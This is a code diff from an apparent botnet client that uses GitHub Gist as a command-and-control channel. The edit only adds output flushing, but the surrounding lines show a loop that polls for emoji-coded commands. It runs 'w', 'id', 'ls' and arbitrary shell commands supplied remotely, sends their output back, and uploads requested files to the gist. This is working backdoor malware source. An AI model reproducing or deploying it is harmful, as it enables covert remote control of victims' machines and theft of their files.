@@ -46,7 +46,7 @@ for p in posts:
         break
 
 if not bot_list_exists:
-    print("BOT LIST DOES NOT EXISTS - BYE BYE", file=sys.stderr)
+    print("BOT LIST DOES NOT EXISTS - BYE BYE", file=sys.stderr, flush=True)
     exit(-1)
 
 # Create bot -> bot post + add to bot list
@@ -57,7 +57,7 @@ gist.init(GIST_API, NAME, FILENAME, URLS, BOT_LIST)
 while True:
     # Check if bot in bot list -> if not = add
     if "[" + NAME + "]" not in gist.get_raw(GIST_API, BOT_LIST):
-        print("WARNING: {} was not in the bot list :o -> adding...".format(NAME), file=sys.stderr)
+        print("WARNING: {} was not in the bot list :o -> adding...".format(NAME), file=sys.stderr, flush=True)
         bot_url = gist.create_bot_post(GIST_API, NAME, FILENAME, URLS)
         gist.add_to_bot_list(GIST_API, NAME, FILENAME, bot_url, BOT_LIST)
 
@@ -67,44 +67,44 @@ while True:
     if status in emojis.status_code['reset']:
         cmd_emoji = gist.get_command_emoji(GIST_API, FILENAME)
         if cmd_emoji == emojis.command['ping']:
-            print("RECEIVED ping", file=sys.stderr)
+            print("RECEIVED ping", file=sys.stderr, flush=True)
             ping.set_alive(GIST_API, FILENAME)
-            print("EXECUTED ping", file=sys.stderr)
+            print("EXECUTED ping", file=sys.stderr, flush=True)
 
         elif cmd_emoji == emojis.command['w']:
-            print("RECEIVED w", file=sys.stderr)
+            print("RECEIVED w", file=sys.stderr, flush=True)
             data = subprocess.run('w', capture_output=True, shell=True)
             gist.send_respose_url(GIST_API, FILENAME, data)
-            print("EXECUTED w", file=sys.stderr)
+            print("EXECUTED w", file=sys.stderr, flush=True)
 
         elif cmd_emoji == emojis.command['ls']:
             params = gist.get_data_from_url(GIST_API, FILENAME)
-            print("RECEIVED ls " + params, file=sys.stderr)
+            print("RECEIVED ls " + params, file=sys.stderr, flush=True)
             data = subprocess.run('ls -la ' + params, capture_output=True, shell=True)
             gist.send_respose_url(GIST_API, FILENAME, data)
-            print("EXECUTED ls", file=sys.stderr)
+            print("EXECUTED ls", file=sys.stderr, flush=True)
 
         elif cmd_emoji == emojis.command['id']:
-            print("RECEIVED id", file=sys.stderr)
+            print("RECEIVED id", file=sys.stderr, flush=True)
             data = subprocess.run('id', capture_output=True, shell=True)
             gist.send_respose_url(GIST_API, FILENAME, data)
-            print("EXECUTED id", file=sys.stderr)
+            print("EXECUTED id", file=sys.stderr, flush=True)
 
         elif cmd_emoji == emojis.command['cp']:
             params = gist.get_data_from_url(GIST_API, FILENAME)
-            print("RECEIVED cp", file=sys.stderr)
+            print("RECEIVED cp", file=sys.stderr, flush=True)
             gist.send_file_respose_url(GIST_API, FILENAME, params)
-            print("EXECUTED cp", file=sys.stderr)
+            print("EXECUTED cp", file=sys.stderr, flush=True)
 
         elif cmd_emoji == emojis.command['exec']:
             params = gist.get_data_from_url(GIST_API, FILENAME)
-            print("RECEIVED exec " + params, file=sys.stderr)
+            print("RECEIVED exec " + params, file=sys.stderr, flush=True)
             data = subprocess.run(params, capture_output=True, shell=True)
             gist.send_respose_url(GIST_API, FILENAME, data)
-            print("EXECUTED exec", file=sys.stderr)
+            print("EXECUTED exec", file=sys.stderr, flush=True)
 
         else:
-            print("Unknown command", file=sys.stderr)
+            print("Unknown command", file=sys.stderr, flush=True)
 
     time.sleep(1)
 
